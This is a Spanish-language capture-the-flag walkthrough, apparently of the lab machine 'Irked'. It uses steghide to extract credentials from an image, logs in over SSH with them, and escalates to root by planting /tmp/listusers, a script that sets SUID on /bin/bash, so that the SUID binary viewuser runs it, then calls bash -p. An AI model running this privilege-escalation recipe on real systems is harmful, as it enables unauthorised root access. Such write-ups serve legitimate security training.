Movimiento lateral

Buscar en ficheros de configuración

# No había ninguna contraseña en los ficheros de configuración, pero la clave del usuario del sistema estaba escondida en un fichero oculto dentro de Documents del usuario djmardov

# Password Steg -> UPupDOWNdownLRlrBAbaSSss

# En este punto debemos de intuir que es estenografía, por lo que debemos descargar la imagen de la web para ver si tiene algún contenido oculto

Aplicamos estenografía

steghide info irked.jpg
# Password Steg -> UPupDOWNdownLRlrBAbaSSss
# Hay un archivo oculto adjunto: pass.txt

Extraer fichero adjunto

steghide extract -sf irked.jpg
# Password Steg -> UPupDOWNdownLRlrBAbaSSss
# Credenciales -> djmardov:Kab6h+m+bbp2J:HG

SSH

ssh djmardov@10.129.17.100
# Password: Kab6h+m+bbp2J:HG

Escalada de Privilegios: SUID

Enumerar SUID

find / -perm -4000 2>/dev/null
# SUID: /usr/bin/viewuser

Ejecutar binario SUID

/usr/bin/viewuser
# Intenta ejecutar con una SH el fichero /tmp/listusers que no existe

Crear fichero /tmp/listusers agregando SUID a bash

#!/bin/bash
chmod u+s /bin/bash

Ejecutar binario

chmod +x /tmp/listusers
/usr/bin/viewuser
bash -p
